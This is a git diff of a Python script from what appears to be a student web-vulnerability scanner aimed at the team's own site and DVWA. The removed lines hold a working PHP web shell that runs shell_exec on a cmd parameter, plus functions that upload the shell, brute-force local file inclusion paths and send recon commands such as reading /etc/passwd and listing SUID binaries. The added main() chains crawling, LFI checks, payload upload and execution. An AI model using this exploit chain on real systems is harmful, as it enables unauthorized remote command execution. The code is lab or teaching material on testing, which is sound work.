@@ -11,7 +11,7 @@ import upload
 
 # Target Configuration (own website)
 URL = "http://ict2214p1b2.mooo.com/"
-COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"} # change this to your own cookie
+COOKIE = {"PHPSESSID": "umi89fhds05jku8kcfe007k7sq"} # change this to your own cookie
 
 # Target Configuration (DVWA)
 # URL = "http://127.0.0.1/DVWA/"
@@ -25,108 +25,10 @@ CONTENT_TYPE_WORDLIST = "wordlists/content_type_big.txt"  # wordlists/content_ty
 UPLOAD_DIR_WORDLIST = "wordlists/upload_dir_wordlist_small.txt"  # wordlists/upload_dir_wordlist_small.txt OR wordlists/upload_dir_wordlist_big.txt
 
 REPORT_FILENAME = "vuln_report.txt"
-CONTENT_TYPE = ['application/x-php','image/jpeg','image/png']
 
-def create_payload():
-    payload_content = """<?php
-    echo "<h3 style='color: green;'>[+] Malicious file uploaded successfully!</h3>";
-    
-    if(isset($_GET['cmd'])) {
-        $commands = explode(';', $_GET['cmd']);
-        foreach($commands as $command) {
-            $clean_cmd = htmlspecialchars(trim($command));
-            echo "<h4>=== Command: {$clean_cmd} ===</h4>";
-            echo "<pre>" . shell_exec($command) . "</pre>";
-        }
-    } else {
-        echo "<p style='color: red;'>ERROR: Add ?cmd=command1;command2</p>";
-    }
-    ?>"""
-    with open(PAYLOAD_FILENAME, 'w') as f:
-        f.write(payload_content)
-    print(f"[+] Payload file '{PAYLOAD_FILENAME}' created.")
 
-def upload_file():
-    for type in CONTENT_TYPE:
-        data = {'Upload': 'Upload', 'MAX_FILE_SIZE': '100000'}
-        files = {'uploaded': (PAYLOAD_FILENAME, open(PAYLOAD_FILENAME, 'rb'), type)}
-        try:
-            print(f"[*] Uploading file with {type}")
-            response = requests.post(UPLOAD_URL, files=files, data=data, cookies=COOKIE)
-            if "succesfully uploaded!" in response.text:
-                print("[+] File uploaded successfully!")
-                return True
-            else:
-                print("[-] Upload failed. Check your cookies and directory permissions.")
-        except Exception as e:
-            print(f"[-] Upload error: {str(e)}")
-    return False
-
-def brute_force_lfi(session):
-    payload_relative = "hackable/uploads/" + PAYLOAD_FILENAME
-
-    with open("lfi.txt", "r") as f:
-        file_data = f.read()
-
-    lfi_payloads = file_data.strip().split("\n")
-    for payload in lfi_payloads:
-        for depth in range(1, 10):
-            traversal = payload * depth
-            test_url = f"{LFI_VULN_URL}{traversal}{payload_relative}"
-            print(f"[*] Trying LFI URL: {test_url}")
-            response = session.get(test_url, cookies=COOKIE)
-            if "[+] Malicious file uploaded successfully!" in response.text:
-                print(f"[+] Successfully included payload: {test_url}")
-                return test_url
-    return None
-
-# def brute_force_lfi(lfi_url_base, payload_relative, session, traversal_list):
-#     """
-#     Tries different directory traversal prefixes to include the uploaded file via the LFI page.
-#     payload_relative is the relative path to the uploaded file (e.g. "hackable/uploads/malicious.php")
-#     """
-#     for traversal in traversal_list:
-#         test_url = f"{lfi_url_base}{traversal}{payload_relative}"
-#         print(f"[*] Trying LFI URL: {test_url}")
-#         try:
-#             r = session.get(test_url, cookies=COOKIE)
-#             # Look for a marker from our payload
-#             if "[+] Malicious file uploaded successfully!" in r.text:
-#                 print(f"[+] Found malicious file via LFI at: {test_url}")
-#                 return test_url
-#         except Exception as e:
-#             print(f"[-] Error testing {test_url}: {str(e)}")
-#     return None
-
-def trigger_payload_via_lfi(url):
-    """
-    Appends the command parameter to the LFI URL to trigger our uploaded payload.
-    """
-    commands = [
-        "id",
-        "uname -a",
-        "grep 'x:1000:' /etc/passwd",
-        "ls -lAh /home",
-        "find /usr/bin /bin -perm -4000 2>/dev/null"
-    ]
-    cmd_string = ";".join(commands)
-    separator = "&" if "?" in url else "?"
-    full_url = f"{url}{separator}cmd={urllib.parse.quote(cmd_string)}"
-    try:
-        print(f"[*] Triggering payload via LFI at: {full_url}")
-        response = requests.get(full_url, cookies=COOKIE)
-        if response.status_code == 200:
-            print("[+] Command results:")
-            print(response.text)
-            return response.text
-        else:
-            print(f"[-] Execution failed (HTTP {response.status_code})")
-            return ""
-    except Exception as e:
-        print(f"[-] Trigger error: {str(e)}")
-        return ""
-
-def generate_report(uploaded_url, lfi_url, command_results):
+def generate_report(uploaded_files, failed_files, executed_files):
+    """Generate a detailed vulnerability report."""
     report = "Vulnerability Report\n"
     report += "====================\n"
 
@@ -157,42 +59,108 @@ def generate_report(uploaded_url, lfi_url, command_results):
         print(f"[-] Error writing report file: {e}")
 
 
-
 def main():
     session = requests.Session()
-    
-    # --- File Upload Phase ---
-    create_payload()
-    if not upload_file():
-        print("[-] Aborting due to upload failure.")
-        return
-    # Direct URL to the uploaded file (if you can access it directly)
-    direct_file_url = f"{UPLOAD_DIR}{PAYLOAD_FILENAME}"
-    print(f"[+] Direct file URL (if accessible): {direct_file_url}")
-    
-    # # --- LFI Brute Force Phase ---
-    # # List of common traversal prefixes
-    # traversal_list = ["", "../", "../../", "../../../", "../../../../", "../../../../../"]
-    # # The relative path (from DVWA root) to the uploaded file
-    # payload_relative = "hackable/uploads/" + PAYLOAD_FILENAME
-    # lfi_found_url = brute_force_lfi(LFI_VULN_URL, payload_relative, session, traversal_list)
-    
-    # # --- Trigger Payload Phase ---
-    # if lfi_found_url:
-    #     command_results = trigger_payload_via_lfi(lfi_found_url)
-    # else:
-    #     print("[-] Could not locate the uploaded file via LFI.")
-    #     command_results = ""
-    
-    # --- LFI Brute Force and Trigger Payload Phase ---
-    lfi_found_url = brute_force_lfi(session)
-    if lfi_found_url:
-        command_results = trigger_payload_via_lfi(lfi_found_url)
-    else:
-        command_results = ""
 
-    # --- Report Generation ---
-    generate_report(direct_file_url, lfi_found_url, command_results)
+    # Ask for indicator for LFI
+    success_indicator = input("Enter the text that indicates success: ")
+    failure_indicator = input("Enter the text that indicates failure: ")
+
+
+    # Step 1: Crawl for URLs
+    found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
+    print("Crawling complete.")
+
+    found_urls = crawler.clean_found_urls(URL, found_urls)
+
+    print("Found URLs:")
+    for url in found_urls:
+        print("[+] " + url)
+    print("\nUploadable URLs:")
+    for url in uploadable_urls:
+        print(f"[+] {url}")
+
+    print("\nPotential LFI vulnerabilities:")
+    lfi_targets = crawler.check_lfi(found_urls)
+
+    form_details = crawler.get_form_details(URL, uploadable_urls, session, COOKIE)
+
+
+    # Step 2: Check for LFI vulnerabilities
+    lfi_confirmed_targets = set()
+    for target in lfi_targets:
+        print(target)
+        result = lfi.show_passwd(target, COOKIE)
+        if result:
+            lfi_confirmed_targets.add(target)
+
+
+    # Step 3: Generate payloads
+    generated_payloads = uploadv2.create_payloads()
+
+
+    # Step 4: Load MIME types
+    mime_types = uploadv2.load_mime_types(CONTENT_TYPE_WORDLIST)
+
+    if not mime_types:
+        print("[-] No MIME types found. Exiting.")
+        exit(1)
+
+
+    # Step 5: Try Uploading Each Payload
+    uploaded_files = []
+    failed_files = []
+
+    for form in form_details:
+        form_action_url = form["action"]
+        for payload in generated_payloads:
+            if uploadv2.upload_file(
+                payload, form_action_url, COOKIE, form, CONTENT_TYPE_WORDLIST
+            ):
+                print(f"[+] File uploaded successfully: {payload} -> {form_action_url}")
+                uploaded_files.append(payload)
+            else:
+                failed_files.append(payload)
+
+    # Step 6: Detect upload directory
+    dynamic_upload_dir = uploadv2.get_upload_directory(
+        URL, UPLOAD_DIR_WORDLIST, uploaded_files, COOKIE
+    )
+
+    if not uploaded_files:
+        print("[-] No files uploaded successfully. Report generated. Exiting.")
+        generate_report(uploaded_files, failed_files, [])
+        exit(1)
+
+    if dynamic_upload_dir:
+        print(f"[+] Detected Upload Directory: {dynamic_upload_dir}")
+    else:
+        print("[-] No valid upload directory found. Exiting.")
+        # generate_report(uploaded_files, failed_files, [])
+        # exit(1)
+
+    # Step 7: Test execution
+    executed_files = []
+    for target in lfi_confirmed_targets:
+        lfi_found_urls = lfi.brute_force_lfi(
+            target,
+            uploaded_files,
+            success_indicator,
+            failure_indicator,
+            UPLOAD_DIR_WORDLIST,
+            session,
+            COOKIE,
+        )
+        if lfi_found_urls:
+            for lfi_found_url in lfi_found_urls:
+                print(f"[+] LFI Found at: {lfi_found_url}")
+                command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
+                if command_results:
+                    print(f"[+] Successfully executed payload at: {lfi_found_url}")
+                    executed_files.append(lfi_found_url)
+
+    # Step 8: Generate Final Report
+    generate_report(uploaded_files, failed_files, executed_files)
 
 
 if __name__ == "__main__":
